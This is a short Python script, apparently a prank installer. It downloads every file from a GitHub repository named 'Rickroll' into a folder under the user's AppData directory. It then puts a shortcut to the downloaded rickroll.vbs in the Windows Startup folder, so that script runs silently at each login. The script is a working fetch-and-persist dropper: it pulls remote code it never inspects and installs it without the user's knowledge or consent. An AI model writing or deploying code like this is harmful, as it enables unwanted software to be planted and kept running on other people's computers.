import os
import requests
import base64
import win32com.client
owner = "PrestonCurtis1"
repo = "Rickroll"
url = f"https://api.github.com/repos/{owner}/{repo}/contents/"
def create_shortcut(target_path, shortcut_path, start_in):
    # Create a new shortcut object
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    
    # Set the target path of the shortcut
    shortcut.TargetPath = target_path
    
    # Set the "Start In" directory to the startup folder
    shortcut.WorkingDirectory = start_in
    
    # Save the shortcut
    shortcut.Save()

response = requests.get(url)
if response.status_code == 200:
    data = response.json()
    os.chdir(os.environ["appdata"])
    if (not os.path.exists("Rickroll")):
        os.mkdir("Rickroll")
    os.chdir("Rickroll")
    for item in data:
        if item["type"] == "file":
            with open(item["name"],"wb") as file:
                download = requests.get(item["download_url"])
                if download.status_code == 200:
                    file.write(download.content)

                else:
                    print(f"Download Error: {download.status_code}")

create_shortcut(os.path.join(os.environ["appdata"],"Rickroll","rickroll.vbs"),os.path.join(win32com.client.Dispatch("WScript.Shell").SpecialFolders("Startup"),"rickroll.lnk"),os.path.join(os.environ["appdata"],"Rickroll"))
    
